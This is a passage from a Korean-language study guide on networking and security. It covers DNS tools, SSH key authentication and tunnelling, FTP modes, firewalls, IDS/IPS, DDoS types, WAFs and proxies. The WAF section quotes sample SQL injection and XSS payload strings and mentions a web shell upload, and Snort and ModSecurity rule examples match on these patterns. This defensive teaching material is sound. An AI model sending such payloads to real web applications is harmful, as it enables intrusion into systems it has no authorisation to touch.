**특정 DNS 서버 사용**:
```bash
dig @8.8.8.8 www.google.com
```

---

#### host (Linux/macOS)

**기본 조회**:
```bash
host www.google.com
```

**출력**:
```
www.google.com has address 142.250.207.100
www.google.com has IPv6 address 2404:6800:4004:825::2004
```

**특정 레코드 타입**:
```bash
host -t MX gmail.com
host -t NS google.com
```

**역방향 조회**:
```bash
host 142.250.207.100
```

---

### DNS 보안 고려사항

#### DNS 스푸핑 (DNS Spoofing)

**공격 시나리오**:
```
1. 사용자: "www.bank.com의 IP는?"
2. 공격자: (응답 조작) "192.0.2.100" (가짜 서버)
3. 사용자: 192.0.2.100 접속 (피싱 사이트)
```

**대응**:
- **DNSSEC (DNS Security Extensions)** 사용
- **DNS over HTTPS (DoH)** 사용
- **DNS over TLS (DoT)** 사용

#### DNSSEC

**개념**: DNS 응답에 **디지털 서명** 추가

**확인**:
```bash
dig www.cloudflare.com +dnssec
```

**출력 (RRSIG 레코드 확인)**:
```
www.cloudflare.com. 300 IN  A     104.16.132.229
www.cloudflare.com. 300 IN  RRSIG A 13 3 300 ...
```

#### DNS over HTTPS (DoH)

**문제**: DNS 질의가 **평문 전송** (도청 가능)

**해결**: **HTTPS로 암호화**

**DoH 제공 업체**:
- Cloudflare: `https://cloudflare-dns.com/dns-query`
- Google: `https://dns.google/dns-query`
- Quad9: `https://dns.quad9.net/dns-query`

**브라우저 설정**:

**Firefox**:
```
설정 → 개인 정보 및 보안 → DNS over HTTPS 활성화
```

**Chrome**:
```
설정 → 보안 및 개인정보 보호 → 보안 DNS 사용
```

---

## 🔐 SSH (Secure Shell)

### SSH란 무엇인가?

**정의**:
- **암호화된 네트워크 프로토콜**
- **원격 시스템 접속** 및 **명령 실행**

**특징**:
- ✅ **암호화**: 모든 통신 암호화
- ✅ **인증**: 서버/클라이언트 신원 확인
- ✅ **무결성**: 데이터 변조 방지
- ✅ **포트 포워딩**: 터널링 지원

**포트 번호**: **22**

---

### SSH vs Telnet

| 특징 | Telnet | SSH |
|:---:|:---:|:---:|
| **포트** | 23 | 22 |
| **암호화** | ❌ 평문 전송 | ✅ 암호화 |
| **인증** | 패스워드만 | 패스워드, 공개키 |
| **보안** | 매우 취약 | 안전 |
| **사용** | ❌ 사용 금지 | ✅ 표준 |

**Telnet의 위험**:
```
공격자: (패킷 스니핑)
"username: admin"
"password: 1234"
→ 즉시 탈취!
```

**SSH의 안전함**:
```
공격자: (패킷 스니핑)
"4f9a2e7b1c3d..."
→ 암호화된 데이터, 해독 불가!
```

---

### SSH 구성 요소

**SSH 프로토콜 계층**:
```
┌─────────────────────────────────┐
│ SSH Connection Protocol         │ ← 채널 관리
├─────────────────────────────────┤
│ SSH User Authentication         │ ← 사용자 인증
├─────────────────────────────────┤
│ SSH Transport Layer Protocol    │ ← 암호화, 키 교환
├─────────────────────────────────┤
│ TCP (Port 22)                   │
└─────────────────────────────────┘
```

---

### SSH 인증 방식

#### 1. 패스워드 인증 (Password Authentication)

**동작**:
```bash
ssh user@192.168.1.100
# Password: ******
```

**과정**:
```
1. 클라이언트: SSH 연결 요청
2. 서버: 암호화 채널 수립
3. 클라이언트: 사용자명 + 비밀번호 전송 (암호화됨)
4. 서버: /etc/shadow 파일과 비교
5. 서버: 인증 성공 → 셸 제공
```

**장점**:
- 간단함

**단점**:
- 브루트포스 공격 위험
- 비밀번호 관리 어려움

---

#### 2. 공개키 인증 (Public Key Authentication) - 권장

**동작 원리**:
```
1. 클라이언트가 키 쌍 생성 (공개키 + 개인키)
2. 공개키를 서버에 등록
3. 접속 시 개인키로 서명 → 서버가 공개키로 검증
```

**키 생성**:

**RSA 키 (2048비트)**:
```bash
ssh-keygen -t rsa -b 2048 -C "user@example.com"
```

**ED25519 키 (권장)**:
```bash
ssh-keygen -t ed25519 -C "user@example.com"
```

**출력**:
```
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/user/.ssh/id_ed25519):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:

Your identification has been saved in /home/user/.ssh/id_ed25519
Your public key has been saved in /home/user/.ssh/id_ed25519.pub
```

**파일 구조**:
```
~/.ssh/
├── id_ed25519       ← 개인키 (절대 공유 금지!)
├── id_ed25519.pub   ← 공개키
├── known_hosts      ← 접속한 서버 목록
└── config           ← SSH 설정 파일
```

**공개키 서버 등록**:

**방법 1: ssh-copy-id (권장)**:
```bash
ssh-copy-id user@192.168.1.100
```

**방법 2: 수동 복사**:
```bash
# 공개키 확인
cat ~/.ssh/id_ed25519.pub

# 서버에 접속 후
echo "공개키 내용" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**접속 테스트**:
```bash
ssh user@192.168.1.100
# 비밀번호 입력 없이 접속됨!
```

**인증 과정 (상세)**:
```
1. 클라이언트: "나는 user야, 공개키 인증 사용"
2. 서버: "user의 공개키 확인... 있네"
3. 서버: 랜덤 값 생성 → 공개키로 암호화 → 클라이언트 전송
4. 클라이언트: 개인키로 복호화 → 서명 생성 → 서버 전송
5. 서버: 공개키로 서명 검증 → ✅ 인증 성공!
```

---

### SSH 기본 사용법

#### 원격 접속

**기본 접속**:
```bash
ssh user@hostname
ssh user@192.168.1.100
```

**포트 지정**:
```bash
ssh -p 2222 user@hostname
```

**로그 레벨 지정**:
```bash
ssh -v user@hostname     # Verbose
ssh -vv user@hostname    # 더 상세
ssh -vvv user@hostname   # 가장 상세
```

---

#### 원격 명령 실행

**단일 명령**:
```bash
ssh user@hostname "ls -la"
ssh user@hostname "df -h"
ssh user@hostname "uptime"
```

**파이프 사용**:
```bash
ssh user@hostname "ps aux | grep nginx"
```

**로컬에서 스크립트 실행**:
```bash
ssh user@hostname < local_script.sh
```

---

#### 파일 전송 (SCP)

**로컬 → 원격**:
```bash
scp file.txt user@hostname:/remote/path/
```

**원격 → 로컬**:
```bash
scp user@hostname:/remote/path/file.txt ./
```

**디렉토리 전송 (-r)**:
```bash
scp -r /local/dir user@hostname:/remote/path/
```

**포트 지정**:
```bash
scp -P 2222 file.txt user@hostname:/path/
```

---

#### SFTP (SSH File Transfer Protocol)

**대화형 세션**:
```bash
sftp user@hostname
```

**SFTP 명령어**:
```bash
sftp> ls                 # 원격 디렉토리 목록
sftp> lls                # 로컬 디렉토리 목록
sftp> pwd                # 원격 현재 디렉토리
sftp> lpwd               # 로컬 현재 디렉토리
sftp> cd /path           # 원격 디렉토리 이동
sftp> lcd /path          # 로컬 디렉토리 이동
sftp> get file.txt       # 파일 다운로드
sftp> put file.txt       # 파일 업로드
sftp> mkdir newdir       # 원격 디렉토리 생성
sftp> rm file.txt        # 원격 파일 삭제
sftp> exit               # 종료
```

---

### SSH 포트 포워딩 (Tunneling)

#### 로컬 포트 포워딩 (Local Port Forwarding)

**시나리오**:
```
[로컬 PC] ━━ SSH (22) ━━> [점프 서버] ━━> [내부 웹 서버:80]
                              ↑
                          방화벽: 22번만 허용
```

**명령어**:
```bash
ssh -L 8080:internal-web-server:80 user@jump-server
```

**의미**:
- 로컬 `localhost:8080` 접속
- → SSH 터널을 통해 `internal-web-server:80`으로 전달

**사용**:
```bash
# SSH 터널 실행 (백그라운드)
ssh -f -N -L 8080:internal-web-server:80 user@jump-server

# 브라우저에서
http://localhost:8080
```

**실제 예제**:
```bash
# 원격 MySQL 접속
ssh -L 3306:localhost:3306 user@db-server

# 로컬에서 MySQL 클라이언트 실행
mysql -h 127.0.0.1 -P 3306 -u dbuser -p
```

**포트 포워딩 도식**:
```
localhost:8080 → SSH (암호화) → jump-server → internal-web-server:80
     ↑                                                    ↓
[브라우저 접속]                                     [웹 페이지 응답]
```

---

#### 리모트 포트 포워딩 (Remote Port Forwarding)

**시나리오**:
```
[내부 PC] ━━ SSH (22, 나가는 방향 허용) ━━> [외부 서버]
   ↑                                             ↓
방화벽: 들어오는 22번 차단                    외부에서 8080 접속 가능
```

**명령어**:
```bash
ssh -R 8080:localhost:80 user@external-server
```

**의미**:
- 외부 서버의 `external-server:8080` 접속
- → SSH 터널을 통해 내부 PC의 `localhost:80`으로 전달

**사용 사례**:
- 회사 내부 웹 서버를 외부에 임시 공개
- 데모 목적

**실제 예제**:
```bash
# 내부 PC에서 실행
ssh -f -N -R 8080:localhost:3000 user@public-server

# 외부에서 접속
http://public-server:8080
```

**주의**:
- 외부 서버의 `/etc/ssh/sshd_config` 설정 필요:
```
GatewayPorts yes
```

---

#### 다이나믹 포트 포워딩 (Dynamic Port Forwarding)

**시나리오**: **SOCKS 프록시** 생성

**명령어**:
```bash
ssh -D 1080 user@proxy-server
```

**의미**:
- 로컬 `localhost:1080`이 **SOCKS 프록시**로 동작
- 모든 애플리케이션 트래픽을 SSH 터널로 전달 가능

**브라우저 설정**:

**Firefox**:
```
설정 → 네트워크 설정 → 수동 프록시 설정
SOCKS Host: localhost
Port: 1080
SOCKS v5 선택
```

**Chrome/Edge (명령줄)**:
```bash
google-chrome --proxy-server="socks5://localhost:1080"
```

**cURL 사용**:
```bash
curl --socks5 localhost:1080 http://example.com
```

**사용 사례**:
- 우회 접속
- 안전한 공용 Wi-Fi 사용

---

### SSH 설정 파일

#### ~/.ssh/config (클라이언트)

**기본 설정**:
```
Host myserver
    HostName 192.168.1.100
    User admin
    Port 22
    IdentityFile ~/.ssh/id_ed25519

Host jump
    HostName jump.example.com
    User ubuntu
    IdentityFile ~/.ssh/jump_key

Host internal
    HostName 10.0.1.50
    User webadmin
    ProxyJump jump
```

**사용**:
```bash
ssh myserver        # 192.168.1.100에 admin으로 접속
ssh internal        # jump를 통해 10.0.1.50 접속
```

**고급 설정**:
```
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    Compression yes
    TCPKeepAlive yes

Host prod-*
    User deployuser
    IdentityFile ~/.ssh/production_key
    StrictHostKeyChecking yes

Host dev-*
    User devuser
    IdentityFile ~/.ssh/development_key
    StrictHostKeyChecking no
```

---

#### /etc/ssh/sshd_config (서버)

**보안 강화 설정**:
```
# 포트 변경 (기본 22 → 다른 포트)
Port 2222

# Root 로그인 금지
PermitRootLogin no

# 비밀번호 인증 비활성화 (공개키만 허용)
PasswordAuthentication no
PubkeyAuthentication yes

# 빈 비밀번호 금지
PermitEmptyPasswords no

# X11 포워딩 비활성화 (필요 없으면)
X11Forwarding no

# 특정 사용자만 허용
AllowUsers admin deploy webmaster

# 또는 특정 그룹만 허용
AllowGroups sshusers

# 로그인 시도 횟수 제한
MaxAuthTries 3

# 접속 타임아웃
LoginGraceTime 60

# 최대 세션 수
MaxSessions 10

# 클라이언트 연결 유지 (NAT/방화벽 타임아웃 방지)
ClientAliveInterval 60
ClientAliveCountMax 3
```

**설정 적용**:
```bash
# 설정 검증
sudo sshd -t

# SSH 서비스 재시작
sudo systemctl restart sshd
```

---

## 📁 FTP (File Transfer Protocol)

### Active vs Passive 모드

#### Active Mode (능동 모드)

**문제 상황**:
```
[클라이언트] ━━ 제어 채널 (21) ━━> [FTP 서버]
     ↑                                  ↓
  방화벽 차단!                    데이터 채널 (20)
```

**동작**:
1. 클라이언트 → 서버: 제어 연결 (포트 21)
2. 클라이언트 → 서버: "내 IP:포트로 데이터 보내줘" (PORT 명령)
3. 서버 → 클라이언트: 데이터 연결 시도 (포트 20 → 클라이언트 포트)
4. ❌ 클라이언트 방화벽 차단!

**문제점**:
- 클라이언트 방화벽이 **인바운드 연결 차단**
- NAT 환경에서 작동 안 함

---

#### Passive Mode (수동 모드) - 권장

**해결**:
```
[클라이언트] ━━ 제어 채널 (21) ━━> [FTP 서버]
            ━━ 데이터 채널 (랜덤) ━━>
                    ↑
              클라이언트가 연결 시작 (아웃바운드 허용)
```

**동작**:
1. 클라이언트 → 서버: 제어 연결 (포트 21)
2. 클라이언트 → 서버: "Passive 모드 사용" (PASV 명령)
3. 서버 → 클라이언트: "내 IP:포트로 데이터 연결해" (예: 192.168.1.100:50000)
4. 클라이언트 → 서버: 데이터 연결 (클라이언트가 연결 시작)
5. ✅ 성공!

**FTP 클라이언트 설정**:

**FileZilla**:
```
Edit → Settings → Connection → FTP → Transfer mode
→ Passive (권장) 선택
```

**명령줄 (lftp)**:
```bash
lftp ftp://user@hostname
lftp> set ftp:passive-mode true
```

---

### FTPS vs SFTP

| 특징 | FTPS | SFTP |
|:---:|:---:|:---:|
| **프로토콜** | FTP + TLS/SSL | SSH |
| **포트** | 21 (제어), 990 (암호화) | 22 |
| **암호화** | TLS/SSL | SSH |
| **방화벽** | 복잡 (여러 포트) | 간단 (1개 포트) |
| **인증서** | 필요 | 불필요 |
| **권장** | ⚠️ 레거시 시스템 | ✅ 최신 시스템 |

**결론**: **SFTP 사용 권장**

---

## ✅ 학습 체크리스트

- [ ] DNS의 역할과 동작 원리를 설명할 수 있다
- [ ] FQDN 구조를 이해한다
- [ ] DNS 레코드 타입(A, AAAA, CNAME, MX, TXT)을 구분할 수 있다
- [ ] 재귀적 질의와 반복적 질의의 차이를 알고 있다
- [ ] SSH와 Telnet의 차이를 설명할 수 있다
- [ ] SSH 공개키 인증 방식을 이해한다
- [ ] SSH 포트 포워딩(로컬, 리모트, 다이나믹)을 구분할 수 있다
- [ ] FTP Active와 Passive 모드의 차이를 설명할 수 있다
- [ ] SFTP와 FTPS의 차이를 알고 있다

---

## 📋 핵심 요약

### DNS
- **역할**: 도메인 이름 → IP 주소 변환
- **계층**: Root → TLD → SLD → Subdomain
- **질의 방식**: 재귀적 (클라이언트 편함) / 반복적 (DNS 서버 간)
- **캐싱**: TTL에 따라 임시 저장

### SSH
- **포트**: 22
- **암호화**: 모든 통신 암호화
- **인증**: 패스워드 (비권장) / 공개키 (권장)
- **포트 포워딩**:
  - 로컬 (-L): 내부 서버 접근
  - 리모트 (-R): 외부 공개
  - 다이나믹 (-D): SOCKS 프록시

### FTP
- **Active**: 서버 → 클라이언트 (방화벽 문제)
- **Passive**: 클라이언트 → 서버 (권장)
- **대안**: SFTP (SSH 기반, 안전)

---

다음 섹션에서는 **네트워크 보안 시스템**을 학습합니다.
# Section 6: 네트워크 보안 시스템

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- 네트워크 보안 아키텍처 설계 원칙
- 방화벽 (전통적, 차세대, UTM) 기술
- IDS와 IPS의 차이 및 배치 방식
- 안티 DDoS 솔루션과 공격 유형
- WAF (Web Application Firewall) 개념
- 프록시 (Forward vs Reverse)
- SSL VPN
- NAC (Network Access Control)
- SIEM/ESM 개요
- 실무 보안 아키텍처 구성

---

## 🏗️ 네트워크 보안 아키텍처

### 계층적 방어 (Defense in Depth)

**개념**: **여러 계층의 보안 장비**로 공격 차단

```mermaid
graph TB
    A[인터넷] --> B[Anti-DDoS<br/>DDoS 공격 차단]
    B --> C[방화벽<br/>패킷 필터링]
    C --> D[IPS/IDS<br/>침입 탐지/차단]
    D --> E[웹 방화벽 WAF<br/>웹 공격 차단]
    E --> F[로드 밸런서<br/>부하 분산]
    F --> G[DMZ<br/>공개 서버 영역]
    F --> H[내부망<br/>업무 시스템]
```

**원칙**:
- **다층 방어**: 하나의 보안 장비에 의존하지 않음
- **심층 방어**: 각 계층에서 다른 위협 차단
- **최소 권한**: 필요한 최소한의 접근만 허용

---

### 네트워크 영역 분리

#### DMZ (Demilitarized Zone)

**정의**: 공개 서버와 내부망 사이의 **완충 영역**

```
[인터넷] ━━ [방화벽1] ━━ [DMZ: 웹 서버, 메일 서버] ━━ [방화벽2] ━━ [내부망: DB, 파일 서버]
```

**목적**:
- 공개 서버 침해 시 **내부망 보호**
- 외부 공격 피해 최소화

**배치 서버**:
- 웹 서버
- 메일 서버
- DNS 서버
- FTP 서버

**방화벽 규칙**:

**방화벽1 (외부 → DMZ)**:
```
허용: 인터넷 → DMZ 웹 서버 (80, 443)
허용: 인터넷 → DMZ 메일 서버 (25, 587, 993)
차단: 그 외 모든 트래픽
```

**방화벽2 (DMZ → 내부망)**:
```
허용: DMZ 웹 서버 → 내부 DB (3306)
차단: DMZ → 내부망 기타 모든 트래픽
```

---

## 🛡️ 방화벽 (Firewall)

### 전통적 방화벽 (Traditional Firewall)

**정의**: **미리 정의된 규칙**으로 패킷 필터링

**동작 계층**: **Layer 3/4** (IP, Port)

**필터링 기준**:
1. **Source IP**: 출발지 IP 주소
2. **Destination IP**: 목적지 IP 주소
3. **Source Port**: 출발지 포트
4. **Destination Port**: 목적지 포트
5. **Protocol**: TCP, UDP, ICMP

**규칙 예시**:
```
1. 허용: 192.168.1.0/24 → 0.0.0.0/0  TCP  80, 443  (인터넷 접속)
2. 허용: 0.0.0.0/0 → 192.168.1.100  TCP  22  (외부에서 SSH 접속)
3. 차단: 192.168.1.0/24 → 192.168.2.0/24  ALL  ALL  (부서 간 차단)
4. 허용: 192.168.1.10 → 192.168.2.50  TCP  3306  (특정 DB 접속)
5. 기본 정책: 차단 (Default Deny)
```

**처리 순서**: **위에서 아래로** (First Match)

**장점**:
- ✅ 빠른 처리 속도
- ✅ 간단한 설정

**단점**:
- ❌ 애플리케이션 계층 공격 차단 불가
- ❌ 포트 80 허용 시 **모든 웹 트래픽 통과** (악성 코드 포함)

---

### 차세대 방화벽 (Next-Generation Firewall, NGFW)

**정의**: **Layer 7 (애플리케이션 계층)**까지 검사

**추가 기능**:
1. **애플리케이션 인식 및 제어**
2. **사용자 기반 정책**
3. **IPS (침입 방지) 통합**
4. **SSL/TLS 복호화 및 검사**
5. **샌드박싱 (의심 파일 분석)**
6. **웹 필터링**
7. **안티바이러스**

**동작 예시**:

**전통적 방화벽**:
```
규칙: 허용 TCP 443
결과: 모든 HTTPS 트래픽 허용
```

**차세대 방화벽**:
```
규칙: 허용 TCP 443, 단 애플리케이션=업무용 웹사이트
      차단 TCP 443, 애플리케이션=소셜미디어 (Facebook, Instagram)
      차단 TCP 443, 파일 전송 기능 포함
결과: HTTPS 트래픽 중 업무용만 선별 허용
```

**애플리케이션 인식**:
```mermaid
graph LR
    A[HTTPS<br/>Port 443] --> B{패킷 분석}
    B --> C[웹 브라우징<br/>허용]
    B --> D[파일 공유<br/>차단]
    B --> E[소셜미디어<br/>차단]
    B --> F[스트리밍<br/>대역폭 제한]
```

**사용자 기반 정책**:
```
규칙1: 사용자=관리자 그룹 → 모든 포트 허용
규칙2: 사용자=개발팀 → SSH(22), DB(3306) 허용
규칙3: 사용자=일반 직원 → HTTP/HTTPS만 허용
```

**Active Directory 연동**:
```
[사용자 로그인] → [AD 인증] → [방화벽에 사용자 정보 전달] → [정책 적용]
```

**SSL/TLS 복호화**:
```
[클라이언트] ━━ HTTPS ━━> [NGFW] ━━ 복호화 ━━> [검사] ━━ 재암호화 ━━> [서버]
                              ↓
                        악성 코드 탐지!
```

**주요 벤더**:
- Palo Alto Networks
- Fortinet (FortiGate)
- Check Point
- Cisco Firepower
- Sophos XG

---

### UTM (Unified Threat Management)

**정의**: **통합 위협 관리 장비**

**포함 기능**:
1. 방화벽
2. IPS/IDS
3. 안티바이러스
4. 안티스팸
5. 웹 필터링
6. VPN

**NGFW vs UTM**:

| 특징 | NGFW | UTM |
|:---:|:---:|:---:|
| **대상** | 대규모 기업 | 중소기업 |
| **성능** | 매우 높음 (수십 Gbps) | 중간 (수 Gbps) |
| **가격** | 수천만~억 원 | 수백만~수천만 원 |
| **관리** | 복잡 (전문가 필요) | 간단 (통합 관리) |
| **확장성** | 높음 | 제한적 |

**UTM 장점**:
- ✅ **올인원**: 여러 장비 대신 1개로 통합
- ✅ **관리 편의**: 하나의 인터페이스
- ✅ **비용 절감**: 중소기업에 적합

**UTM 단점**:
- ❌ 모든 기능 활성화 시 **성능 저하**
- ❌ SPOF (Single Point of Failure): 하나 고장 시 전체 중단

**주요 벤더**:
- Fortinet (FortiGate - NGFW/UTM 겸용)
- SonicWall
- WatchGuard
- Sophos
- Zyxel

---

## 🚨 IDS/IPS (침입 탐지/방지 시스템)

### IDS (Intrusion Detection System)

**정의**: 침입 **탐지 전용** (차단 안 함)

**동작**:
```
[네트워크 트래픽] → [IDS 분석] → [공격 탐지!] → [관리자에게 알림]
                                              ↓
                                        트래픽은 계속 흐름
```

**탐지 방법**:

#### 1. 시그니처 기반 (Signature-based)
```
공격 패턴 DB: "SQL Injection", "XSS", "Buffer Overflow"
        ↓
트래픽에서 패턴 발견 → 경고
```

**장점**:
- 정확도 높음
- 오탐(False Positive) 적음

**단점**:
- 새로운 공격 탐지 불가 (Zero-day)
- DB 업데이트 필요

#### 2. 이상 행위 기반 (Anomaly-based)
```
정상 트래픽 학습 → 기준선(Baseline) 생성
        ↓
비정상 트래픽 탐지 (통계적 편차)
```

**예시**:
```
평소: 서버 A → 서버 B 트래픽 100MB/일
오늘: 서버 A → 서버 B 트래픽 10GB/일
      ↓
경고: 데이터 유출 의심!
```

**장점**:
- 새로운 공격 탐지 가능

**단점**:
- 오탐 많음
- 학습 기간 필요

---

### IPS (Intrusion Prevention System)

**정의**: 침입 **차단** (탐지 + 차단)

**동작**:
```
[네트워크 트래픽] → [IPS 분석] → [공격 탐지!] → [패킷 차단]
                                              ↓
                                        공격 차단됨
```

**IDS vs IPS**:

| 특징 | IDS | IPS |
|:---:|:---:|:---:|
| **역할** | 탐지만 | 탐지 + 차단 |
| **배치** | Out-of-band (미러링) | In-line (경로 상) |
| **성능** | 영향 없음 | 지연 발생 가능 |
| **위험** | 낮음 | 오탐 시 정상 차단 |

---

### IDS/IPS 배치 방식

#### 1. In-line 방식 (IPS)

**구조**:
```
[인터넷] ━━> [방화벽] ━━> [IPS] ━━> [스위치] ━━> [내부망]
                             ↑
                     모든 트래픽 통과
```

**특징**:
- **모든 패킷이 IPS 통과**
- 공격 패킷 **즉시 차단**
- IPS 고장 시 **네트워크 전체 중단** (위험)

**고가용성 (HA)**:
```
                    ┌━━ [IPS1] ━━┐
[방화벽] ━━> [L2 스위치]         [L2 스위치] ━━> [내부망]
                    └━━ [IPS2] ━━┘
                         (Failover)
```

---

#### 2. Mirror/TAP 방식 (IDS)

**구조**:
```
[방화벽] ━━> [스위치] ━━> [내부망]
               ↓ (미러링)
             [IDS]
```

**미러링 (Port Mirroring)**:
```
스위치 설정:
  Port 1 (방화벽): 정상 트래픽 흐름
  Port 24 (IDS): Port 1의 모든 트래픽 복사
```

**Cisco 스위치 설정 예시**:
```
monitor session 1 source interface GigabitEthernet 0/1
monitor session 1 destination interface GigabitEthernet 0/24
```

**TAP (Test Access Point) 장비**:
```
[방화벽] ━━> [TAP 장비] ━━> [스위치]
               ↓ (복사)
             [IDS]
```

**장점**:
- IDS 고장 시에도 **네트워크 정상 동작**
- 성능 영향 없음

**단점**:
- 공격 차단 불가 (탐지만)
- 실시간 차단 필요 시 방화벽에 자동 규칙 추가 필요

---

### 주요 IDS/IPS 솔루션

#### Snort (오픈소스)

**특징**:
- 가장 널리 사용되는 **오픈소스 IDS**
- 시그니처 기반
- 룰(Rule) 기반 탐지

**설치 (Ubuntu)**:
```bash
sudo apt-get install snort
```

**룰 예시** (`/etc/snort/rules/local.rules`):
```
alert tcp any any -> 192.168.1.0/24 80 (msg:"Possible SQL Injection"; content:"UNION SELECT"; nocase; sid:1000001;)
```

**실행**:
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

---

#### Suricata (오픈소스)

**특징**:
- **멀티스레드 지원** (고성능)
- IDS + IPS 모두 가능
- GPU 가속 지원

**설치 (Ubuntu)**:
```bash
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
sudo apt-get install suricata
```

**IPS 모드 실행**:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

**룰 업데이트**:
```bash
sudo suricata-update
```

**로그 확인**:
```bash
tail -f /var/log/suricata/fast.log
```

---

#### 상용 솔루션

**글로벌**:
- Cisco Firepower
- Palo Alto Networks (NGFW 통합)
- Trend Micro TippingPoint
- McAfee Network Security Platform

**국내**:
- 안랩 TrusGuard
- 펜타시큐리티 WAPPLES (WAF 겸용)
- 이글루시큐리티
- 윈스

---

## 🌊 Anti-DDoS (DDoS 방어 솔루션)

### DDoS 공격 유형

#### Layer 3/4 공격 (Network/Transport Layer)

**SYN Flood**:
```
공격자: SYN SYN SYN SYN ... (대량 전송, ACK 안 보냄)
        ↓
서버: SYN-RECEIVED 상태로 대기 (연결 큐 고갈)
        ↓
결과: 정상 사용자 연결 불가
```

**방어**:
- SYN Cookie
- SYN Proxy

**UDP Flood**:
```
공격자: 대량의 UDP 패킷 전송
        ↓
서버: 처리 능력 초과 (CPU, 대역폭 고갈)
```

**방어**:
- Rate Limiting
- UDP 포트 차단 (불필요 시)

**ICMP Flood (Ping Flood)**:
```
공격자: ping 요청 폭주
        ↓
서버: ICMP 응답 과부하
```

**방어**:
- ICMP Rate Limiting
- ICMP 차단 (외부에서)

---

#### Layer 7 공격 (Application Layer)

**HTTP GET Flood**:
```
공격자: GET / HTTP/1.1 요청 대량 전송
        ↓
웹 서버: 정상적인 요청처럼 보여 처리
        ↓
결과: 웹 서버 CPU, 메모리 고갈
```

**특징**:
- 적은 트래픽으로도 **큰 피해**
- 방화벽 통과 (정상 HTTP 요청)

**방어**:
- Rate Limiting (IP당 요청 수 제한)
- CAPTCHA
- JavaScript Challenge

**Slowloris 공격**:
```
공격자: HTTP 요청을 천천히 전송 (헤더 조금씩)
        ↓
웹 서버: 요청 완료 대기 (연결 유지)
        ↓
결과: 연결 슬롯 고갈
```

**방어**:
- Timeout 설정
- 최대 연결 수 제한

**DNS Query Flood**:
```
공격자: DNS 쿼리 대량 전송 (보통 증폭 공격)
        ↓
DNS 서버: 응답 처리 과부하
```

---

### Anti-DDoS 솔루션 동작

**클린징 센터 (Scrubbing Center)**:
```
[정상 사용자] ━━━━━┓
[공격자] ━━━━━━━━━┫━━> [Anti-DDoS] ━━> [정상 트래픽만] ━━> [웹 서버]
[공격자] ━━━━━━━━━┛        ↓
                      [공격 트래픽 차단]
```

**필터링 기법**:
1. **Rate Limiting**: IP당 요청 속도 제한
2. **Geo-Blocking**: 특정 국가 IP 차단
3. **Blacklist/Whitelist**: IP 리스트 관리
4. **Challenge-Response**: CAPTCHA, JS 챌린지
5. **Anomaly Detection**: 비정상 패턴 탐지

---

### CDN 기반 DDoS 방어

**Cloudflare, Akamai, AWS CloudFront**:
```
[공격자] ━━━━━━━━━┓
[정상 사용자] ━━━━━┫━━> [CDN 엣지 서버] ━━> [오리진 서버]
[공격자] ━━━━━━━━━┛        ↓
                      (CDN에서 흡수)
```

**장점**:
- 글로벌 분산 (수백 개 서버)
- 대규모 트래픽 흡수 가능 (수백 Gbps)
- WAF 기능 통합

---

## 🔥 WAF (Web Application Firewall)

### 정의

**WAF**: **웹 애플리케이션 공격 차단** 전용 방화벽

**방화벽 vs WAF**:

| 특징 | 전통적 방화벽 | WAF |
|:---:|:---:|:---:|
| **계층** | Layer 3/4 | Layer 7 |
| **차단 대상** | IP, Port | 웹 공격 (SQL Injection, XSS) |
| **HTTP 이해** | 없음 | 있음 |

---

### WAF 차단 공격 유형

#### SQL Injection
```
공격: http://example.com/user?id=1' OR '1'='1
        ↓
WAF: 패턴 탐지 "OR '1'='1" → 차단
```

#### XSS (Cross-Site Scripting)
```
공격: http://example.com/search?q=<script>alert('XSS')</script>
        ↓
WAF: 패턴 탐지 "<script>" → 차단
```

#### 파일 업로드 공격
```
공격: 파일명=shell.php (웹셸 업로드)
        ↓
WAF: 위험한 확장자 차단
```

#### CSRF (Cross-Site Request Forgery)
```
WAF: CSRF 토큰 검증
```

---

### WAF 배치

**Inline 모드**:
```
[클라이언트] ━━> [WAF] ━━> [웹 서버]
                  ↑
            모든 요청 검사
```

**Reverse Proxy 모드**:
```
[클라이언트] ━━> [WAF (Reverse Proxy)] ━━> [웹 서버]
                  ↑
            WAF가 프록시 역할
```

---

### 주요 WAF 솔루션

**클라우드 WAF**:
- AWS WAF
- Cloudflare WAF
- Azure Web Application Firewall

**온프레미스**:
- F5 BIG-IP ASM
- Imperva SecureSphere
- Penta Security WAPPLES (국내)
- Barracuda WAF

**오픈소스**:
- ModSecurity (Apache/Nginx 모듈)

**ModSecurity 예시**:
```nginx
# Nginx에 ModSecurity 적용
load_module modules/ngx_http_modsecurity_module.so;

http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
```

**룰 예시**:
```
SecRule ARGS "@contains <script>" "id:1001,deny,status:403,msg:'XSS Attack'"
SecRule ARGS "@contains UNION SELECT" "id:1002,deny,status:403,msg:'SQL Injection'"
```

---

## 🔄 프록시 (Proxy)

### Forward Proxy

**정의**: 클라이언트를 대신해서 **인터넷에 요청**

```
[클라이언트] ━━> [Forward Proxy] ━━> [인터넷]
                     ↑
              클라이언트 IP 숨김
```

**용도**:
1. **캐싱**: 자주 요청하는 콘텐츠 저장
2. **필터링**: 특정 웹사이트 차단 (회사, 학교)
3. **익명화**: 클라이언트 IP 숨김
4. **대역폭 절약**: 캐시 히트 시 외부 요청 안 함

**예시**:
```
직원 → Forward Proxy → 인터넷
         ↓
   SNS 접속 차단
   게임 사이트 차단
```

**Squid Proxy 설정**:
```bash
# 설치
sudo apt-get install squid

# 설정 (/etc/squid/squid.conf)
http_port 3128
acl localnet src 192.168.1.0/24
acl blocked_sites dstdomain .facebook.com .youtube.com
http_access deny blocked_sites
http_access allow localnet
```

**클라이언트 설정**:
```
브라우저 → 설정 → 프록시 설정
프록시 서버: 192.168.1.50
포트: 3128
```

---

### Reverse Proxy

**정의**: 서버를 대신해서 **클라이언트 요청 처리**

```
[클라이언트] ━━> [Reverse Proxy] ━━> [웹 서버]
                     ↑
              서버 IP 숨김, 부하 분산
```

**용도**:
1. **로드 밸런싱**: 여러 서버로 요청 분산
2. **SSL/TLS Offloading**: 암호화 처리 대행
3. **캐싱**: 정적 콘텐츠 캐시
4. **보안**: 실제 서버 IP 숨김

